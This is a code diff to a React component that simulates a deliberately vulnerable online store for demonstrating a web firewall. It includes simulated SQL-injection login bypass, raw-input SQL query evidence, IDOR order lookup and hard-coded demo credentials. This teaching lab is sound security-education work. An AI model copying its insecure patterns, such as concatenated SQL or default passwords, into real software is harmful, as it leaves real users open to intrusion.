@@ -1,8 +1,8 @@
 // ============================================================================
 // WebGuard — Web Lab: Multi-page realistic website simulation
 // Apex CyberStore & Cloud Platform — A modern, fully-featured vulnerable web app
-// with real navigation, shopping cart, reviews, IDOR order lookup, diagnostics,
-// admin console, and real-time WAF attack/defense demonstration
+// with authentic public storefront, progressive authentication unlocking,
+// IDOR order lookup, Stored/Reflected XSS, SQLi bypass, diagnostics, and real-time WAF
 // ============================================================================
 
 import { useState, useCallback, useRef, useEffect, useMemo } from "react";
@@ -92,16 +92,17 @@ import {
 // ============================================================================
 
 export type SitePage =
-  | "store"
-  | "product"
+  | "home"
+  | "products"
+  | "product-detail"
   | "cart"
   | "login"
   | "register"
   | "dashboard"
   | "settings"
-  | "search"
+  | "docs"
   | "contact"
-  | "tools"
+  | "diagnostics"
   | "admin";
 
 interface WebLabProps {
@@ -171,7 +172,7 @@ interface OrderRecord {
 }
 
 // ============================================================================
-// Realistic Data Fixtures
+// Data Fixtures
 // ============================================================================
 
 const PRODUCTS: Product[] = [
@@ -183,8 +184,8 @@ const PRODUCTS: Product[] = [
     rating: 4.9,
     reviewsCount: 148,
     badge: "Bestseller",
-    description: "FIDO2 / WebAuthn hardware authenticator with NFC & biometrics for military-grade MFA.",
-    specs: ["FIDO2 Level 3", "USB-C & Lightning", "NFC Enabled", "Zero-trust verified"],
+    description: "FIDO2 / WebAuthn hardware authenticator with NFC & biometrics for zero-trust MFA.",
+    specs: ["FIDO2 Level 3 Certified", "USB-C & NFC Dual-Interface", "Hardware Crypto Engine", "Tamper-Resistant Silicon"],
     stock: 42,
     icon: "🔑",
   },
@@ -196,8 +197,8 @@ const PRODUCTS: Product[] = [
     rating: 4.8,
     reviewsCount: 56,
     badge: "Enterprise",
-    description: "Rack-mount high-throughput hardware firewall with on-chip AI ML threat classification.",
-    specs: ["40 Gbps Inspection", "Sub-millisecond latency", "Dual 10GbE SFP+", "Redundant PSU"],
+    description: "High-throughput 40 Gbps rack-mount hardware firewall with on-chip AI ML threat classification.",
+    specs: ["40 Gbps Deep Packet Inspection", "Sub-millisecond Latency", "Dual 10GbE SFP+ Ports", "Redundant Titanium PSU"],
     stock: 12,
     icon: "🛡️",
   },
@@ -210,7 +211,7 @@ const PRODUCTS: Product[] = [
     reviewsCount: 89,
     badge: "Popular",
     description: "24/7 AI-augmented SIEM & automated threat triage with instant incident response playbooks.",
-    specs: ["Unlimited EPS", "Live Gemini Copilot Triage", "Global Edge Anycast", "SOC 2 Type II"],
+    specs: ["Unlimited EPS Logging", "Automated Gemini Copilot Triage", "Anycast Edge Routing", "SOC 2 Type II Certified"],
     stock: 999,
     icon: "☁️",
   },
@@ -221,8 +222,8 @@ const PRODUCTS: Product[] = [
     price: 249.99,
     rating: 4.9,
     reviewsCount: 210,
-    description: "Self-encrypting hardware drive with AES-XTS 256-bit crypto controller and physical tamper erase.",
-    specs: ["7,400 MB/s Read", "FIPS 140-3 Level 2", "Hardware Destruction Pin", "PCIe Gen4 x4"],
+    description: "Self-encrypting hardware drive with AES-XTS 256-bit crypto controller and physical tamper wipe.",
+    specs: ["7,400 MB/s Sequential Read", "FIPS 140-3 Level 2 Cryptography", "Zero-Trace Wipe Trigger", "PCIe Gen4 x4 Interface"],
     stock: 28,
     icon: "💾",
   },
@@ -233,20 +234,20 @@ const PRODUCTS: Product[] = [
     price: 199.0,
     rating: 4.6,
     reviewsCount: 34,
-    description: "Automated DAST/SAST scanner for GitHub Actions and GitLab pipelines with OWASP Top 10 rules.",
-    specs: ["Automated PR checks", "Container Image Scanning", "SBOM generation", "Zero-day feeds"],
+    description: "Automated DAST/SAST scanner for GitHub Actions and GitLab pipelines with OWASP Top 10 rule validation.",
+    specs: ["Automated Pull Request Checks", "Container Image Analysis", "SBOM Auto-Generation", "Zero-Day Threat Feeds"],
     stock: 999,
     icon: "⚡",
   },
   {
     id: 106,
-    name: "Zero-Trust VPN Gateway Router",
+    name: "Zero-Trust Mesh Gateway Router",
     category: "hardware",
     price: 449.0,
     rating: 4.7,
     reviewsCount: 77,
     description: "Hardware micro-segmented gateway with WireGuard crypto tunneling and continuous posture checks.",
-    specs: ["WireGuard & IPsec", "10 Gbps Firewall", "SD-WAN Mesh", "Multi-WAN failover"],
+    specs: ["WireGuard & IPsec Engine", "10 Gbps Firewall Routing", "Autonomous SD-WAN Mesh", "Multi-WAN Auto-Failover"],
     stock: 19,
     icon: "🌐",
   },
@@ -258,14 +259,14 @@ const INITIAL_REVIEWS: ProductReview[] = [
     author: "Elena Rostova (Lead Security Architect)",
     rating: 5,
     date: "2 days ago",
-    comment: "Flawless FIDO2 integration. We deployed 400 keys across engineering with zero auth friction.",
+    comment: "Flawless FIDO2 integration. Deployed 400 keys across engineering with zero authentication issues.",
   },
   {
     id: "rev-2",
-    author: "David Chen (DevOps Engineer)",
+    author: "David Chen (DevOps Lead)",
     rating: 5,
     date: "1 week ago",
-    comment: "Build quality is top tier. NFC works instantaneously with all mobile authenticators.",
+    comment: "Build quality is top tier. NFC works instantaneously with all enterprise mobile authenticators.",
   },
 ];
 
@@ -342,11 +343,11 @@ const FAKE_USERS = [
     department: "Application Engineering",
   },
   {
-    username: "guest",
-    password: "guest",
-    name: "Guest User",
+    username: "customer",
+    password: "customer123",
+    name: "Emma Watson",
     role: "Customer",
-    email: "guest@external.com",
+    email: "emma@customer.com",
     avatar: "👤",
     apiKeys: "sk_test_public_guest_key",
     department: "Public Consumer",
@@ -357,7 +358,6 @@ const DOC_ARTICLES = [
   { id: "doc-1", title: "Configuring Virtual Patching on WebGuard WAF", category: "WAF Policy", snippet: "Learn how to deploy regex and ML-driven virtual patches at the edge to block zero-day exploits before backend remediation." },
   { id: "doc-2", title: "OWASP Top 10 Attack Signatures & Prevention", category: "Threat Intelligence", snippet: "Detailed breakdown of SQLi, Stored/Reflected XSS, SSRF, Path Traversal, and Command Injection signatures." },
   { id: "doc-3", title: "FIDO2 Hardware Key Zero-Trust Integration", category: "Identity & Access", snippet: "Step-by-step setup guide for WebAuthn credential enrollment and biometric enforcement across distributed endpoints." },
-  { id: "doc-4", title: "API Gateway Rate Limiting & Evasion Detection", category: "Edge Defense", snippet: "How entropy scoring and Shannon analysis detect obfuscated, mutated, and double-encoded payloads in real time." },
 ];
 
 // ============================================================================
@@ -387,20 +387,21 @@ export function WebLabTab({
   const [internalWafOn, setInternalWafOn] = useState<boolean>(
     externalWafOn !== undefined ? externalWafOn : wafState.mode === "blocking"
   );
-
   const activeWaf = internalWafOn;
 
   // Multi-page navigation state
-  const [currentPage, setCurrentPage] = useState<SitePage>("store");
+  // Initial page: "home" (clean normal public home page)
+  const [currentPage, setCurrentPage] = useState<SitePage>("home");
   const [selectedProduct, setSelectedProduct] = useState<Product>(PRODUCTS[0]);
   const [currentUser, setCurrentUser] = useState<typeof FAKE_USERS[0] | null>(null);
   const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([
-    { product: PRODUCTS[0], quantity: 2 },
+    { product: PRODUCTS[0], quantity: 1 },
   ]);
   const [selectedCategory, setSelectedCategory] = useState<string>("all");
   const [searchQuery, setSearchQuery] = useState<string>("");
   const [navigating, setNavigating] = useState<boolean>(false);
   const [siteAlert, setSiteAlert] = useState<SiteAlert | null>(null);
+  const [showAttackPills, setShowAttackPills] = useState<boolean>(true);
 
   // Dynamic Content & Exploit State
   const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);
@@ -459,7 +460,7 @@ export function WebLabTab({
       setTimeout(() => {
         setCurrentPage(page);
         setNavigating(false);
-      }, 150);
+      }, 120);
     },
     [currentPage]
   );
@@ -498,7 +499,7 @@ export function WebLabTab({
       const effectiveVulnId = explicitVuln || result.vulnId;
       const resLog: LogEntry = {
         id: uid("LOG"),
-        ts: Date.now() + 80,
+        ts: Date.now() + 60,
         type: result.blocked ? "waf" : "response",
         status: result.response.status,
         statusText: result.blocked ? "Forbidden" : result.response.status === 200 ? "OK" : "Error",
@@ -584,7 +585,7 @@ export function WebLabTab({
         if (isSql) {
           setActiveExploitDisplay({
             vulnId: "sqli-search",
-            title: "💥 SQL Injection — Database Tables Dumped",
+            title: "💥 SQL Injection — Database Rows Dumped",
             description: "Search filter interpolated raw input into SQL without parameterized queries.",
             evidence: `SELECT * FROM products WHERE name LIKE '%${query}%' --\nRows returned: 4 secret rows from 'users' and 'api_keys'`,
             data: [
@@ -629,7 +630,7 @@ export function WebLabTab({
         evidence: `Payload: ${uname}\nAuthenticated as: ${adminUser.name} (${adminUser.role}) without password!`,
         data: adminUser,
       });
-      toast.success("Bypassed Login via SQLi", { description: "Logged in as SuperAdmin!" });
+      toast.success("Bypassed Login via SQLi", { description: "Logged in as SuperAdmin! Unlocked Admin & Diagnostics." });
       navigateTo("admin");
       return;
     }
@@ -640,7 +641,7 @@ export function WebLabTab({
       toast.success(`Welcome back, ${matched.name}!`);
       navigateTo("dashboard");
     } else {
-      toast.error("Invalid credentials (try admin / admin123 or use an SQLi payload)");
+      toast.error("Invalid credentials (try admin / admin123, jsmith / password, or use an SQLi payload)");
     }
   };
 
@@ -832,18 +833,22 @@ export function WebLabTab({
   ).length;
 
   const urlPath =
-    currentPage === "store"
+    currentPage === "home"
       ? "/"
-      : currentPage === "product"
+      : currentPage === "products"
+      ? "/products"
+      : currentPage === "product-detail"
       ? `/products/${selectedProduct.id}`
       : currentPage === "cart"
-      ? "/checkout/cart"
+      ? "/account/cart-orders"
       : currentPage === "dashboard"
       ? "/account/dashboard"
-      : currentPage === "tools"
+      : currentPage === "diagnostics"
       ? "/system/diagnostics"
       : currentPage === "admin"
-      ? "/admin/console"
+      ? "/admin/vault"
+      : currentPage === "docs"
+      ? "/knowledge-base"
       : `/${currentPage}`;
 
   return (
@@ -851,27 +856,27 @@ export function WebLabTab({
       {/* Top Banner: Master WAF Defense Controller */}
       <div
         className={cn(
-          "flex flex-wrap items-center justify-between gap-4 rounded-2xl border-2 px-5 py-3.5 transition-all duration-500 shadow-md",
+          "flex flex-wrap items-center justify-between gap-4 rounded-2xl border-2 px-5 py-3.5 transition-all duration-500 shadow-xl",
           activeWaf
-            ? "border-emerald-500/50 bg-emerald-500/[0.07] shadow-emerald-500/10"
-            : "border-red-500/50 bg-red-500/[0.07] shadow-red-500/10",
-          attackEffect === "exploit" && "animate-pulse border-red-500 bg-red-500/15 shadow-[0_0_35px_rgba(239,68,68,0.2)]",
-          attackEffect === "blocked" && "animate-pulse border-emerald-500 bg-emerald-500/15 shadow-[0_0_35px_rgba(16,185,129,0.2)]"
+            ? "border-emerald-500/50 bg-[#071318]/90 shadow-emerald-500/10"
+            : "border-red-500/50 bg-[#160a0f]/90 shadow-red-500/10",
+          attackEffect === "exploit" && "animate-pulse border-red-500 bg-red-950/40 shadow-[0_0_35px_rgba(239,68,68,0.3)]",
+          attackEffect === "blocked" && "animate-pulse border-emerald-500 bg-emerald-950/40 shadow-[0_0_35px_rgba(16,185,129,0.3)]"
         )}
       >
         <div className="flex items-center gap-3.5">
           <div
             className={cn(
               "flex size-11 items-center justify-center rounded-xl font-bold shadow-inner transition-colors",
-              activeWaf ? "bg-emerald-500/20 text-emerald-400" : "bg-red-500/20 text-red-400"
+              activeWaf ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40" : "bg-red-500/20 text-red-400 border border-red-500/40"
             )}
           >
             {activeWaf ? <ShieldCheck className="size-6" /> : <ShieldOff className="size-6" />}
           </div>
           <div>
             <div className="flex items-center gap-2">
-              <p className={cn("text-base font-extrabold tracking-tight", activeWaf ? "text-emerald-400" : "text-red-400")}>
-                {activeWaf ? "🛡️ WebGuard WAF Protection: ACTIVE" : "⚠️ WebGuard WAF: DISABLED (Exploit Mode)"}
+              <p className={cn("text-sm md:text-base font-extrabold tracking-tight", activeWaf ? "text-emerald-400" : "text-red-400")}>
+                {activeWaf ? "🛡️ WebGuard WAF: ACTIVE (Blocking Exploits)" : "⚠️ WebGuard WAF: DISABLED (Exploit Demonstration Mode)"}
               </p>
               <span
                 className={cn(
@@ -879,33 +884,33 @@ export function WebLabTab({
                   activeWaf ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30" : "bg-red-500/20 text-red-300 border border-red-500/30"
                 )}
               >
-                {activeWaf ? "Blocking Attacks" : "Vulnerabilities Exploitable"}
+                {activeWaf ? "Shielding Site" : "Vulnerabilities Open"}
               </span>
             </div>
-            <p className="text-xs text-muted-foreground mt-0.5">
+            <p className="text-xs text-slate-400 mt-0.5">
               {activeWaf
-                ? "All 7 attack classes (SQLi, XSS, IDOR, SSRF, CMDi, Path Traversal) are inspected & blocked at the edge."
-                : "The website is completely unprotected. Test real exploit payloads below to see live data leaks and compromise."}
+                ? "Inspection active. All SQLi, XSS, IDOR, CMDi, and SSRF attacks will be intercepted with 403 Forbidden."
+                : "Firewall disabled. Exploits will execute directly against the simulated application."}
             </p>
           </div>
         </div>
 
         {/* WAF Toggle & Live Stats */}
-        <div className="flex flex-wrap items-center gap-4">
-          <div className="flex items-center gap-4 rounded-xl border border-border/40 bg-card/60 px-3.5 py-1.5 text-xs">
+        <div className="flex flex-wrap items-center gap-3">
+          <div className="flex items-center gap-3 rounded-xl border border-slate-700/60 bg-slate-900/80 px-3.5 py-1.5 text-xs">
             <div className="text-center">
-              <p className="font-mono font-bold text-foreground">{totalReqs}</p>
-              <p className="text-[9px] text-muted-foreground uppercase font-semibold">Total Reqs</p>
+              <p className="font-mono font-bold text-slate-200">{totalReqs}</p>
+              <p className="text-[9px] text-slate-400 uppercase font-semibold">Total Reqs</p>
             </div>
-            <div className="h-6 w-px bg-border/40" />
+            <div className="h-6 w-px bg-slate-700/60" />
             <div className="text-center">
               <p className="font-mono font-bold text-emerald-400">{blockedReqs}</p>
-              <p className="text-[9px] text-muted-foreground uppercase font-semibold">WAF Blocked</p>
+              <p className="text-[9px] text-slate-400 uppercase font-semibold">Blocked</p>
             </div>
-            <div className="h-6 w-px bg-border/40" />
+            <div className="h-6 w-px bg-slate-700/60" />
             <div className="text-center">
               <p className="font-mono font-bold text-red-400">{exploitedReqs}</p>
-              <p className="text-[9px] text-muted-foreground uppercase font-semibold">Exploited</p>
+              <p className="text-[9px] text-slate-400 uppercase font-semibold">Exploited</p>
             </div>
           </div>
 
@@ -925,7 +930,7 @@ export function WebLabTab({
               </>
             ) : (
               <>
-                <ShieldCheck className="size-4" /> Turn WAF ON (Enable Shield)
+                <ShieldCheck className="size-4" /> Turn WAF ON (Protect Site)
               </>
             )}
           </Button>
@@ -938,40 +943,32 @@ export function WebLabTab({
             LEFT: Interactive Simulated Website (Browser Frame)
         ════════════════════════════════════════════════════════════════════ */}
         <div className="xl:col-span-7 flex flex-col gap-3">
-          <div className="wg-panel overflow-hidden p-0 shadow-2xl rounded-2xl border border-border/60 bg-card">
+          <div className="overflow-hidden p-0 shadow-2xl rounded-2xl border border-slate-700/70 bg-[#0a0f1d] text-slate-100">
             {/* Browser Window Chrome */}
-            <div className="flex items-center gap-2.5 border-b border-border/50 bg-muted/70 px-4 py-2.5">
+            <div className="flex items-center gap-2.5 border-b border-slate-800 bg-[#0d1527] px-4 py-2.5">
               <div className="flex items-center gap-1.5">
-                <span className="size-3 rounded-full bg-red-500/80 shadow-sm" />
-                <span className="size-3 rounded-full bg-amber-500/80 shadow-sm" />
-                <span className="size-3 rounded-full bg-emerald-500/80 shadow-sm" />
+                <span className="size-3 rounded-full bg-rose-500 shadow-sm" />
+                <span className="size-3 rounded-full bg-amber-500 shadow-sm" />
+                <span className="size-3 rounded-full bg-emerald-500 shadow-sm" />
               </div>
 
-              {/* Navigation Arrows */}
-              <div className="flex items-center gap-1 text-muted-foreground ml-1">
+              {/* Navigation Controls */}
+              <div className="flex items-center gap-1 text-slate-400 ml-1">
                 <button
                   type="button"
-                  onClick={() => navigateTo("store")}
-                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
-                  title="Back to Store"
+                  onClick={() => navigateTo("home")}
+                  className="rounded p-1 hover:bg-slate-800 hover:text-white transition"
+                  title="Home"
                 >
-                  <ArrowLeft className="size-3.5" />
-                </button>
-                <button
-                  type="button"
-                  onClick={() => navigateTo("dashboard")}
-                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
-                  title="Forward to Dashboard"
-                >
-                  <ArrowRight className="size-3.5" />
+                  <Home className="size-3.5" />
                 </button>
                 <button
                   type="button"
                   onClick={() => {
                     setNavigating(true);
-                    setTimeout(() => setNavigating(false), 200);
+                    setTimeout(() => setNavigating(false), 150);
                   }}
-                  className="rounded p-1 hover:bg-background/80 hover:text-foreground transition"
+                  className="rounded p-1 hover:bg-slate-800 hover:text-white transition"
                   title="Reload"
                 >
                   <RefreshCw className={cn("size-3.5", navigating && "animate-spin")} />
@@ -979,101 +976,189 @@ export function WebLabTab({
               </div>
 
               {/* URL Address Bar */}
-              <div className="flex flex-1 items-center gap-2 rounded-xl border border-border/50 bg-background/90 px-3 py-1.5 shadow-inner">
+              <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-700/60 bg-[#070b14] px-3 py-1.5 shadow-inner">
                 <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-400" : "text-amber-400")} />
-                <span className="flex-1 truncate font-mono text-xs text-foreground/80">
+                <span className="flex-1 truncate font-mono text-xs text-slate-300">
                   https://apex-cyberstore.io<span className="text-cyan-400 font-semibold">{urlPath}</span>
                 </span>
                 <span
                   className={cn(
-                    "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md",
-                    activeWaf ? "bg-emerald-500/15 text-emerald-400" : "bg-red-500/15 text-red-400"
+                    "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border",
+                    activeWaf
+                      ? "bg-emerald-500/15 text-emerald-400 border-emerald-500/30"
+                      : "bg-red-500/15 text-red-400 border-red-500/30"
                   )}
                 >
                   {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
-                  {activeWaf ? "WAF PROXIED" : "UNPROTECTED"}
+                  {activeWaf ? "WAF ACTIVE" : "UNPROTECTED"}
                 </span>
               </div>
             </div>
 
             {/* Store Top Navigation Bar */}
-            <div className="flex flex-wrap items-center justify-between border-b border-border/40 bg-gradient-to-r from-card via-muted/30 to-card px-4 py-2.5 gap-2">
+            <div className="flex flex-wrap items-center justify-between border-b border-slate-800/80 bg-[#0e1629] px-4 py-2.5 gap-2">
               {/* Brand Logo */}
               <button
                 type="button"
-                onClick={() => navigateTo("store")}
-                className="flex items-center gap-2 group text-left"
+                onClick={() => navigateTo("home")}
+                className="flex items-center gap-2.5 group text-left"
               >
                 <div className="flex size-8 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 text-white font-black shadow-md">
                   ⚡
                 </div>
                 <div>
-                  <span className="text-sm font-extrabold tracking-tight text-foreground group-hover:text-cyan-400 transition">
+                  <span className="text-sm font-extrabold tracking-tight text-white group-hover:text-cyan-400 transition">
                     Apex CyberStore
                   </span>
-                  <p className="text-[9px] text-muted-foreground uppercase tracking-wider font-semibold">
+                  <p className="text-[8px] text-slate-400 uppercase tracking-wider font-semibold">
                     Enterprise Defense & Cloud
                   </p>
                 </div>
               </button>
 
-              {/* Navigation Menu Tabs */}
+              {/* Navigation Menu Tabs (Unlocks more when signed in) */}
               <div className="flex items-center gap-1 overflow-x-auto">
-                {[
-                  { page: "store" as SitePage, label: "Store", icon: <Home className="size-3.5" /> },
-                  { page: "cart" as SitePage, label: `Cart (${cart.reduce((a, b) => a + b.quantity, 0)})`, icon: <ShoppingCart className="size-3.5" /> },
-                  { page: "search" as SitePage, label: "Docs", icon: <BookOpen className="size-3.5" /> },
-                  { page: "tools" as SitePage, label: "Diagnostics", icon: <Wrench className="size-3.5" />, badge: "VULN" },
-                  { page: "contact" as SitePage, label: "Support", icon: <Mail className="size-3.5" /> },
-                  ...(currentUser
-                    ? [
-                        { page: "dashboard" as SitePage, label: "Dashboard", icon: <LayoutDashboard className="size-3.5" /> },
-                        ...(currentUser.role.includes("Admin")
-                          ? [{ page: "admin" as SitePage, label: "Admin Console", icon: <Unlock className="size-3.5 text-amber-400" />, badge: "SECRET" }]
-                          : []),
-                      ]
-                    : []),
-                ].map((item) => (
-                  <button
-                    key={item.page}
-                    type="button"
-                    onClick={() => navigateTo(item.page)}
-                    className={cn(
-                      "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all relative",
-                      currentPage === item.page
-                        ? "bg-cyan-500/15 text-cyan-400 border border-cyan-500/30 shadow-sm"
-                        : "text-muted-foreground hover:bg-muted/50 hover:text-foreground"
+                <button
+                  type="button"
+                  onClick={() => navigateTo("home")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                    currentPage === "home"
+                      ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm"
+                      : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                  )}
+                >
+                  <Home className="size-3.5" />
+                  <span>Home</span>
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => navigateTo("products")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                    currentPage === "products" || currentPage === "product-detail"
+                      ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm"
+                      : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                  )}
+                >
+                  <Package className="size-3.5" />
+                  <span>Products</span>
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => navigateTo("docs")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                    currentPage === "docs"
+                      ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm"
+                      : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                  )}
+                >
+                  <BookOpen className="size-3.5" />
+                  <span>Docs</span>
+                </button>
+
+                <button
+                  type="button"
+                  onClick={() => navigateTo("contact")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                    currentPage === "contact"
+                      ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-sm"
+                      : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                  )}
+                >
+                  <Mail className="size-3.5" />
+                  <span>Support</span>
+                </button>
+
+                {/* ── UNLOCKED WHEN SIGNED IN ── */}
+                {currentUser && (
+                  <>
+                    <button
+                      type="button"
+                      onClick={() => navigateTo("dashboard")}
+                      className={cn(
+                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                        currentPage === "dashboard"
+                          ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
+                          : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                      )}
+                    >
+                      <LayoutDashboard className="size-3.5 text-cyan-400" />
+                      <span>Dashboard</span>
+                    </button>
+
+                    <button
+                      type="button"
+                      onClick={() => navigateTo("cart")}
+                      className={cn(
+                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                        currentPage === "cart"
+                          ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
+                          : "text-slate-300 hover:bg-slate-800 hover:text-white"
+                      )}
+                    >
+                      <ShoppingCart className="size-3.5 text-amber-400" />
+                      <span>Orders & Cart ({cart.length})</span>
+                    </button>
+
+                    {/* Admin Only Diagnostic & Vault Tools */}
+                    {currentUser.role.includes("Admin") && (
+                      <>
+                        <button
+                          type="button"
+                          onClick={() => navigateTo("diagnostics")}
+                          className={cn(
+                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                            currentPage === "diagnostics"
+                              ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
+                              : "text-emerald-400/80 hover:bg-emerald-950/40 hover:text-emerald-300"
+                          )}
+                        >
+                          <Wrench className="size-3.5 text-emerald-400" />
+                          <span>Diagnostics</span>
+                        </button>
+
+                        <button
+                          type="button"
+                          onClick={() => navigateTo("admin")}
+                          className={cn(
+                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
+                            currentPage === "admin"
+                              ? "bg-amber-500/20 text-amber-300 border border-amber-500/40"
+                              : "text-amber-400/80 hover:bg-amber-950/40 hover:text-amber-300"
+                          )}
+                        >
+                          <Unlock className="size-3.5 text-amber-400" />
+                          <span>Admin Vault</span>
+                        </button>
+                      </>
                     )}
-                  >
-                    {item.icon}
-                    <span>{item.label}</span>
-                    {item.badge && (
-                      <span className="rounded bg-red-500/20 px-1 py-0.2 text-[8px] font-bold text-red-400 border border-red-500/30">
-                        {item.badge}
-                      </span>
-                    )}
-                  </button>
-                ))}
+                  </>
+                )}
               </div>
 
               {/* User Session Bar */}
               <div className="flex items-center gap-2">
                 {currentUser ? (
-                  <div className="flex items-center gap-2 rounded-xl border border-border/50 bg-background/80 px-2.5 py-1">
+                  <div className="flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/90 px-2.5 py-1 shadow-sm">
                     <span className="text-base">{currentUser.avatar}</span>
                     <div className="text-left leading-none">
-                      <p className="text-[11px] font-bold text-foreground">{currentUser.name}</p>
-                      <p className="text-[9px] text-muted-foreground">{currentUser.role}</p>
+                      <p className="text-[11px] font-bold text-white">{currentUser.name}</p>
+                      <p className="text-[9px] text-cyan-400">{currentUser.role}</p>
                     </div>
                     <button
                       type="button"
                       onClick={() => {
                         setCurrentUser(null);
-                        toast.info("Logged out.");
-                        navigateTo("store");
+                        toast.info("Logged out successfully.");
+                        navigateTo("home");
                       }}
-                      className="ml-1 text-muted-foreground hover:text-red-400 transition"
-                      title="Logout"
+                      className="ml-1.5 text-slate-400 hover:text-red-400 transition"
+                      title="Sign Out"
                     >
                       <LogOut className="size-3.5" />
                     </button>
@@ -1081,9 +1166,8 @@ export function WebLabTab({
                 ) : (
                   <Button
                     size="sm"
-                    variant="outline"
                     onClick={() => navigateTo("login")}
-                    className="h-8 gap-1.5 text-xs font-bold rounded-xl border-cyan-500/40 text-cyan-400 hover:bg-cyan-500/10"
+                    className="h-8 gap-1.5 text-xs font-bold rounded-xl bg-cyan-500 text-black hover:bg-cyan-400 shadow-md"
                   >
                     <Key className="size-3.5" /> Sign In
                   </Button>
@@ -1097,10 +1181,10 @@ export function WebLabTab({
                 className={cn(
                   "flex items-start justify-between border-b px-4 py-2.5 text-xs transition-all",
                   siteAlert.type === "error"
-                    ? "border-red-500/30 bg-red-500/10 text-red-300"
+                    ? "border-red-500/40 bg-red-950/50 text-red-200"
                     : siteAlert.type === "warning"
-                    ? "border-amber-500/30 bg-amber-500/10 text-amber-300"
-                    : "border-emerald-500/30 bg-emerald-500/10 text-emerald-300"
+                    ? "border-amber-500/40 bg-amber-950/50 text-amber-200"
+                    : "border-emerald-500/40 bg-emerald-950/50 text-emerald-200"
                 )}
               >
                 <div className="flex items-start gap-2.5">
@@ -1115,7 +1199,7 @@ export function WebLabTab({
                 <button
                   type="button"
                   onClick={() => setSiteAlert(null)}
-                  className="text-muted-foreground hover:text-foreground ml-2"
+                  className="text-slate-400 hover:text-white ml-2"
                 >
                   <X className="size-3.5" />
                 </button>
@@ -1124,28 +1208,28 @@ export function WebLabTab({
 
             {/* Active Exploit Popout Visualizer (Shows when an attack succeeds) */}
             {activeExploitDisplay && (
-              <div className="border-b-2 border-red-500/40 bg-gradient-to-r from-red-950/40 via-red-900/20 to-red-950/40 p-4 transition-all animate-in fade-in slide-in-from-top-2">
+              <div className="border-b-2 border-red-500/50 bg-gradient-to-r from-red-950/70 via-red-900/40 to-red-950/70 p-4 transition-all">
                 <div className="flex items-start justify-between">
                   <div className="flex items-center gap-2">
                     <span className="flex size-7 items-center justify-center rounded-lg bg-red-500/20 text-red-400 font-bold">
                       ⚠️
                     </span>
                     <div>
-                      <h4 className="text-sm font-extrabold text-red-400">{activeExploitDisplay.title}</h4>
-                      <p className="text-xs text-muted-foreground">{activeExploitDisplay.description}</p>
+                      <h4 className="text-sm font-extrabold text-red-300">{activeExploitDisplay.title}</h4>
+                      <p className="text-xs text-slate-300">{activeExploitDisplay.description}</p>
                     </div>
                   </div>
                   <Button
                     size="sm"
                     variant="ghost"
-                    className="h-7 text-xs text-muted-foreground hover:text-foreground"
+                    className="h-7 text-xs text-slate-300 hover:text-white"
                     onClick={() => setActiveExploitDisplay(null)}
                   >
                     Dismiss
                   </Button>
                 </div>
 
-                <div className="mt-2.5 rounded-xl border border-red-500/30 bg-black/60 p-3 font-mono text-xs">
+                <div className="mt-2.5 rounded-xl border border-red-500/40 bg-black/80 p-3 font-mono text-xs">
                   <p className="text-[10px] font-bold uppercase tracking-wider text-red-400 mb-1">
                     Captured Backend Exploit Evidence:
                   </p>
@@ -1155,10 +1239,10 @@ export function WebLabTab({
 
                   {/* Render extracted table data if present */}
                   {Array.isArray(activeExploitDisplay.data) && (
-                    <div className="mt-2 overflow-x-auto border-t border-red-500/20 pt-2">
-                      <table className="w-full text-left text-[10px] text-foreground/80">
+                    <div className="mt-2 overflow-x-auto border-t border-red-500/30 pt-2">
+                      <table className="w-full text-left text-[10px] text-slate-200">
                         <thead>
-                          <tr className="border-b border-border/40 text-red-400 font-bold">
+                          <tr className="border-b border-slate-700 text-red-400 font-bold">
                             <th className="py-1">Username</th>
                             <th className="py-1">Role</th>
                             <th className="py-1">Password Hash</th>
@@ -1167,10 +1251,10 @@ export function WebLabTab({
                         </thead>
                         <tbody>
                           {activeExploitDisplay.data.map((row, idx) => (
-                            <tr key={idx} className="border-b border-border/20 font-mono">
+                            <tr key={idx} className="border-b border-slate-800 font-mono">
